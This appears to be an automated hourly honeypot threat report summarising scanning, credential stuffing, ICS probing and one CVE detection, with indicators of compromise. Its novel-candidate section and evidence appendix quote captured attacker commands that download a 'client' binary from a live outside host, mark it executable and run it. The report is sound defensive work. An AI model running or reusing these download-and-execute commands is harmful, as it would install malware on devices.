# Investigation Report 2026-03-04T03:00:04Z - 2026-03-04T04:00:04Z

## Executive Triage Summary

- **Top services/ports of interest:** SSH (22), SMTP (25), VNC/RDP related (5902, 5925, 5926), PostgreSQL (5435), 6037, 8728. Kamstrup protocol activity was observed on Conpot.
- **Top confirmed known exploitation:** One instance of CVE-2024-14007 detected, targeting port 6037.
- **Top unmapped exploit-like items:** Adbhoney honeypot captured attempts to download and execute a "client" binary from `http://193.25.217.83:8000/client`.
- **Botnet/campaign mapping highlights:** A broad scanning and credential stuffing campaign originating heavily from DigitalOcean ASNs, with a distinct IP `142.93.132.11` showing high activity. The Adbhoney activity points to a suspected staging/C2 server at 193.25.217.83.
- **Major uncertainties:** Source IP information for the detected CVE-2024-14007 alert is missing. No general URL path data was available for analysis.

## Candidate Discovery Summary

- **Total attacks:** 7424 events
- **Top attacking countries:** Netherlands (3605), United States (1942), Canada (474), Switzerland (318), Ukraine (228).
- **Top attacking source IPs:** 142.93.132.11 (3534), 136.114.97.84 (328), 46.19.137.194 (318).
- **Top attacker ASNs:** DigitalOcean, LLC (AS14061 - 4659), Modat B.V. (AS209334 - 459).
- **CVEs detected:** 1 (CVE-2024-14007).
- **Top Suricata alert categories:** Generic Protocol Command Decode (9265), Misc activity (2768).
- **Top Suricata signatures:** SURICATA IPv4 truncated packet (4377), SURICATA AF-PACKET truncated packet (4377), GPL INFO VNC server response (2645).
- **Credential stuffing attempts:** Top usernames "root" (194), "user" (28); top passwords "123456" (81), "123" (24).
- **Honeypot activity:** Tanner honeypot observed requests for `/.env` files. Redis honeypot observed 'info' and 'ping' commands. Adbhoney captured malware download commands and one malware sample. Conpot observed Kamstrup protocol activity.
- **OS distribution from P0f:** Windows NT kernel (14633), Linux 2.2.x-3.x (9079).
- **Missing inputs:** Source IP for CVE-2024-14007 detection.

## Emerging N-Day Exploitation

- **CVE/Signature Mapping:** CVE-2024-14007
- **Evidence Summary:** 1 event detected.
- **Affected Service/Port:** 6037
- **Confidence:** Provisional (due to missing source IP)
- **Operational Notes:** Further investigation required to identify source and full context.

## Novel or Zero-Day Exploit Candidates

- **Candidate ID:** ADBHONEY_MALWARE_001
- **Classification:** Novel exploit candidate
- **Novelty Score:** Medium
- **Confidence:** Medium
- **Provisional:** True
- **Key Evidence:** Adbhoney inputs: `cd /data/local/tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client` and `cd /tmp && busybox wget 193.25.217.83:8000/client -O client && chmod 744 client && ./client`. Malware sample `dl/ba7523dde31b617c53322d39fa7a321435d68bb7191696b7631ddf1bb296cd57.raw` (3 counts). Source IP: 193.25.217.83.
- **Knownness Checks Performed:** No explicit OSINT performed.
- **Temporal Checks:** Unavailable
- **Required Follow-up:** Binary analysis of "client", OSINT on IP 193.25.217.83 and associated domain/file hash.

## Botnet/Campaign Infrastructure Mapping

- **Item ID:** CAMPAIGN_001
- **Campaign Shape:** Spray (widespread scanning and credential stuffing), with specific targeted malware delivery.
- **Suspected Compromised Source IPs:**
    - 142.93.132.11 (3534 counts)
    - 136.114.97.84 (328 counts)
    - 46.19.137.194 (318 counts)
    - 193.25.217.83 (for Adbhoney activity)
- **ASNs / Geo Hints:** DigitalOcean, LLC (AS14061) - Netherlands; Modat B.V. (AS209334) - United States; Gravhosting LLC (AS215292) - Netherlands (for 193.25.217.83).
- **Suspected Staging Indicators:**
    - HTTP URLs from web scanning: `/`, `/.env`, `/v1/metrics/droplet_id/553005910`, `/static/wp-content/themes/twentyeleven/js/html5.js`, `/login`.
    - Adbhoney malware download URL: `http://193.25.217.83:8000/client`.
- **Suspected C2 Indicators:** The IP `193.25.217.83` (from Adbhoney malware download attempts) is a strong candidate for a C2/staging server.
- **Confidence:** High for general scanning/credential stuffing campaign, medium for C2 (requires binary analysis of the 'client' binary).
- **Operational Notes:** Block known attacker IPs and the suspected C2/staging IP. Monitor traffic to/from DigitalOcean ASNs for similar patterns.

## Odd-Service / Minutia Attacks

- **Service Fingerprint:** Kamstrup protocol over TCP, specifically observed on destination port 5435 (typically PostgreSQL).
- **Why it's unusual/interesting:** Kamstrup is an Industrial Control System (ICS) protocol. Its detection on a general honeypot and on a port commonly associated with database services is unusual and indicates potential probing for misconfigured or vulnerable ICS systems.
- **Evidence Summary:** 3 events for `kamstrup_management_protocol`, 3 for `kamstrup_protocol`. Originating country Switzerland for some traffic on port 5435.
- **Confidence:** Medium
- **Recommended Monitoring Pivots:** Monitor for Kamstrup protocol traffic, especially on non-standard ICS ports and services. Investigate source IPs targeting ICS-related services.

- **Service Fingerprint:** VNC server responses on non-standard ports 5925, 5926, 5902.
- **Why it's unusual/interesting:** While VNC is a common remote access protocol, detection on non-standard ports with high alert counts (`GPL INFO VNC server response`) suggests attempts to discover or exploit misconfigured or hidden VNC services.
- **Evidence Summary:** 2645 alerts for "GPL INFO VNC server response". Top destination ports for United States include 5925 (264 counts), 5926 (264 counts), and 5902 (113 counts).
- **Confidence:** High
- **Recommended Monitoring Pivots:** Block source IPs engaging in widespread VNC scanning. Investigate VNC activity on non-standard ports for potential compromise attempts.

## Known-Exploit / Commodity Exclusions

- **Credential Noise:** Widespread attempts to authenticate with common usernames ("root", "user", "admin") and weak passwords ("123456", "123", "password"). This activity is indicative of automated brute-force or dictionary attacks and was observed across numerous source IPs, particularly from DigitalOcean ASNs.
- **Scanning Activity:** High volume of Suricata alerts related to fragmented packets ("SURICATA IPv4 truncated packet", "SURICATA AF-PACKET truncated packet") and generic protocol command decodes, alongside specific scans for MS Terminal Server traffic on non-standard ports. This signifies broad reconnaissance and scanning. IP reputation data identified 254 instances of "mass scanner".
- **General Network Anomalies:** Alerts such as "SURICATA STREAM reassembly sequence GAP" and "SURICATA Applayer Wrong direction first Data" indicate general network oddities that are common in noisy network environments and not necessarily indicative of targeted exploitation.

## Infrastructure & Behavioral Classification

- **Exploitation vs. Scanning:** The majority of observed activity points to broad scanning and commodity credential stuffing. There is one instance of a CVE being detected, and one potential novel malware delivery attempt via Adbhoney honeypot.
- **Campaign Shape:** Predominantly a spray campaign characterized by widespread scanning and brute-force attempts. A more targeted, but still automated, component is evident in the Adbhoney malware delivery attempts.
- **Infra Reuse Indicators:** Significant activity originates from DigitalOcean ASNs, suggesting the use of cloud hosting providers for attack infrastructure. The IP `142.93.132.11` exhibits consistently high attack volume.
- **Odd-Service Fingerprints:** Distinct activity observed targeting ICS protocols (Kamstrup) and VNC services on non-standard ports.

## Evidence Appendix

### CVE-2024-14007:

- **Source IPs:** Missing
- **ASNs:** Missing
- **Target Ports/Services:** 6037
- **Paths/Endpoints:** Missing
- **Payload/Artifact Excerpts:** Missing
- **Staging Indicators:** Missing
- **Temporal Checks:** Unavailable

### Adbhoney Malware Download (ABDHONEY_MALWARE_001):

- **Source IPs:** 193.25.217.83 (1 count)
- **ASNs:** AS215292 (Gravhosting LLC - Netherlands)
- **Target Ports/Services:** 5555 (Adbhoney default)
- **Paths/Endpoints:** `http://193.25.217.83:8000/client`
- **Payload/Artifact Excerpts:** `cd /data/local/tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client`, malware file `dl/ba7523dde31b617c53322d39fa7a321435d68bb7191696b7631ddf1bb296cd57.raw`
- **Staging Indicators:** 193.25.217.83:8000
- **Temporal Checks:** Unavailable

### Botnet/Campaign Infrastructure Mapping (CAMPAIGN_001):

- **Source IPs with Counts:** 142.93.132.11 (3534), 136.114.97.84 (328), 46.19.137.194 (318)
- **ASNs with Counts:** DigitalOcean, LLC (AS14061 - 4659), Modat B.V. (AS209334 - 459), Gravhosting LLC (AS215292 - 51 for 193.25.217.83)
- **Target Ports/Services:** 22, 25, 5925, 5926, 5902, 5435, 6037, 8728, 5555.
- **Paths/Endpoints:** `/`, `/.env`, `/v1/metrics/droplet_id/553005910`, `/static/wp-content/themes/twentyeleven/js/html5.js`, `/login`.
- **Payload/Artifact Excerpts:** Usernames ("root", "user", "admin"), Passwords ("123456", "123", "password").
- **Staging Indicators:** 193.25.217.83:8000
- **Temporal Checks:** Unavailable

## Indicators of Interest

- **IPs:** 142.93.132.11, 136.114.97.84, 46.19.137.194, 193.25.217.83
- **URLs:** `http://193.25.217.83:8000/client`
- **Paths:** `/.env`, `/v1/metrics/droplet_id/553005910`
- **Payload Fragments:** "root", "123456", "client" (binary name)
- **CVE:** CVE-2024-14007

## Backend Tool Issues

- **`top_src_ips_for_cve`:** Returned no source IPs for CVE-2024-14007, despite a CVE detection. This weakens the ability to fully map the exploitation infrastructure for this CVE.
- **`field_presence_check`:** Indicated that the `has_url_path` field had 0 documents, meaning generic URL path data was not broadly available for analysis. This limits the scope of web-path based investigations outside of specific honeypot outputs (Tanner, src_ip_to_http_url).
- **`kibanna_discover_query`:** Failed when trying to query with a long, multi-command string as the `value` for `input.keyword`, indicating limitations in direct raw event searching for complex strings. This required a fallback to `two_level_terms_aggregated` to link inputs to source IPs.
